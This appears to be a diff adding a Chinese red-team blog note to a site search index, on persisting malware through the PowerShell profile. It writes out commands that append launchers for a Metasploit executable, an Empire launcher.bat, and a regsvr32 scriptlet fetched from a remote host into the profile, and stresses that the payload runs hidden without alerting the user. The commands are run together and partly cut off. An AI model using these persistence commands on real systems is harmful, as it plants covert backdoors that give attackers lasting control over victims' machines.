+echo $profiletest-Path $profilenew-Item -Path $profile -Type File –Force$string = &#x27;Start-Process &quot;C:\\Users\\hacker\Desktop\\msf.exe&quot;&#x27;$string | Out-File -FilePath &quot;C:\Users\hacker\Documents\WindowsPowerShell\Microsoft.PowerShell_profile.ps1&quot; -Append
+
+与启动进程类似，“ Invoke-Item ” cmdlet可用于执行项目的默认操作，即运行文件，打开应用程序等。launcher.bat是Empire生成的有效负载，具有自我删除的能力作为更秘密的选择执行时，因为它不会创建新进程。
+所需要的命令
+echo $profiletest-Path $profilenew-Item -Path $profile -Type File –Forceadd-Content $profile &quot;Invoke-Item C:\tmp\launcher.bat&quot;$string | Out-File -FilePath &quot;C:\Users\hacker\Documents\WindowsPowerShell\Microsoft.PowerShell_profile.ps1&quot; -Append
+
+这样当PowerShell在系统上再次启动时，将执行该文件，并且代理将与命令和控件进行通讯。执行过程不会像上面的示例那样在系统上创建新进程，而是使用现有的PowerShell进程，更为隐蔽。
+cmdlet“ Invoke-Command ”的用法中允许执行命令，所以regsvr32方法可以用作隐藏选项，因为它可以规避未正确配置的应用程序白名单解决方案，并且可以从远程执行scriptlet。
+参考命令：
+echo $profiletest-Path $profilenew-Item -Path $profile -Type File –Force$string = &#x27;Invoke-Command -ScriptBlock &#123; regsvr32 /s /n /u /i:http://192.168.73.136:80/jWcEbr.sct scrobj.dll &#125;&#x27;$string | Out-File -FilePath &quot;C:\Users\hacker\Documents\WindowsPowerShel
+
+Metasploit框架包含一个模块（web_delivery），该模块可以生成并提供恶意scriptlet文件。但是，其他命令或者控制（C2）框架（例如PoshC2）也支持此功能，并且与Metasploit相比，可以提供扩展的功能。
+
+注意：使用多个命令对PowerShell配置文件进行大量修改会向用户发送一条有关增加加载时间的消息。但是，执行一个命令不会产生任何消息，有效负载将在后台运行，并且用户不会注意到任何异常。
+]]></content>
+      <categories>
+        <category>红队笔记</category>
+      </categories>
+      <tags>
+        <tag>权限维持</tag>
       </tags>
   </entry>
 </search>
